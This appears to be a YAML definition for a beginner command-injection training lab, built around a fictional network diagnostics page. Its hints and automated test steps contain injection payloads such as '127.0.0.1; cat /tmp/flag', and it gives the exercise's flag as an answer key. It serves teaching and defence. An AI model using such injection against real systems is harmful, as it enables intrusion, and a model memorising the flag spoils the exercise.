title: Diagnostics Command Injection
category: exploitation
difficulty: beginner
estimated_time: 15
prerequisites:
  - software-security-1-1-hidden-export-route
# By completion students will be able to:
learning_outcomes:
  - Identify untrusted input flowing into a shell
  - Run a benign lookup and observe the command output
  - Use a shell separator to read the flag file
  - Explain how to fix the bug with argument arrays and allowlisting
mapped_skills:
  - web_api
  - network_systems
assessment_criteria:
  - Submit the correct flag.
  - Pass every automated test step in the lab manifest.
  - Explain the vulnerable call and show the argument-array replacement.
learning_concepts:
  - command injection
  - shell metacharacters
  - secure process invocation
competency_tags:
  - appsec.command_injection
  - appsec.secure_process_execution
  - appsec.input_validation
  - secure_coding.argument_arrays
defensive_skills:
  - avoid_shell_strings
  - use_argument_arrays
  - allowlist_host_input
  - least_privilege_service
  - test_metacharacters
evidence_required:
  - benign_lookup_output
  - injected_command_output
  - secure_code_example
report_questions:
  - Which input reached the shell, and how did you know?
  - What evidence shows the second command executed?
  - Why is an argument array safer than a shell string?
  - Which metacharacters would your regression test include?
mitre_attack:
  - tactic: Execution
    technique: T1059
    technique_name: Command and Scripting Interpreter
    detection: Log process creation and command-line arguments for unexpected interpreters.

owner: "OpenCyberRange Curriculum"
content_version: "2.5.3"
reviewed_at: "2026-11-08"
review_status: "automated static proof; live walkthrough pending"
description: "A browser-only command-injection starter for the Community Dev Day software-security track. A small network diagnostics page passes a hostname to a shell. Find the injection point and read the flag, then explain how to remove the shell safely."
visibility: public
flag: "OCR{sh3ll_1nj3ct10n_1s_4_bug}"

tools:
  - browser

scenario: |
  The Community Dev Day volunteer team added a small diagnostics page to check that
  conference network names resolve. It accepts a hostname and prints the
  lookup result.

  The page was written quickly. The developer passed the visitor's input to a
  shell command, so a separator can turn one lookup into two commands.

  This is a safe, fictional target in an isolated lab container. You do not
  need a terminal: the page shows the command output in your browser. The flag
  is a training value, and the container is read-only with all capabilities
  dropped.

troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
defensive_takeaways: "Avoid invoking a shell when a direct API or an argument array will do. Pass arguments as a list, allowlist the host value, run the service with least privilege, treat all input as untrusted, and add regression tests for metacharacters such as ; & | $ backticks and parentheses."
difficulty_evidence: "Static student-tester walkthrough of the workbook and lab definition; live lab run not recorded; declared difficulty 'beginner' retained as provisional."
difficulty_evidence_source: "reviewer_walkthrough"
difficulty_evidence_sample: 1
difficulty_evidence_quality: "provisional"
difficulty_evidence_reviewed_at: "2026-11-08"
workbook: "wiki/range/software-security/CH_SWSEC_Software_Security/02_Diagnostics_Command_Injection/"

hostnames:
  - ip_offset: "92"
    hostname: "diag.lab"
    description: "Community Dev Day diagnostics page (HTTP 8080)"

topology:
  nodes:
    - id: "diagnostics"
      label: "Community Dev Day diagnostics page"
      type: "server"
      ip_offset: "92"
      ports: [8080]
      services: ["http"]
      x: 1
      y: 1

hints:
  - text: |
      Open http://diag.lab:8080 in the lab browser. Try the default lookup for
      127.0.0.1. The result is the output of a command run by the server.
    unlock_after_minutes: 0

  - text: |
      The page probably builds a shell command like:

      getent hosts <your input>

      In a shell, a semicolon separates commands. Try adding a second command
      after a normal hostname.
    unlock_after_minutes: 4

  - text: |
      The training flag is in /tmp/flag inside the target container. Build up
      from a harmless command rather than jumping straight to the file:

      127.0.0.1; id
      127.0.0.1; ls /tmp
      127.0.0.1; cat /tmp/flag

      The first shows the service account, the second shows what it can see,
      and the third reads the flag. Ask a facilitator if you are stuck; using a
      hint is expected.
    unlock_after_minutes: 8

test:
  steps:
    - name: "Diagnostics page responds"
      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.diagnostics}:8080/"
      expect: "200"
      timeout: 20

    - name: "Normal lookup responds"
      command: "curl -s -o /dev/null -w '%{http_code}' 'http://{target.diagnostics}:8080/lookup?host=127.0.0.1'"
      expect: "200"
      timeout: 20

    - name: "Injected command returns the flag"
      command: "curl -s 'http://{target.diagnostics}:8080/lookup?host=127.0.0.1%3Bcat%20/tmp/flag' | grep -o 'OCR{[^}]*}'"
      expect: "OCR{sh3ll_1nj3ct10n_1s_4_bug}"
      timeout: 20
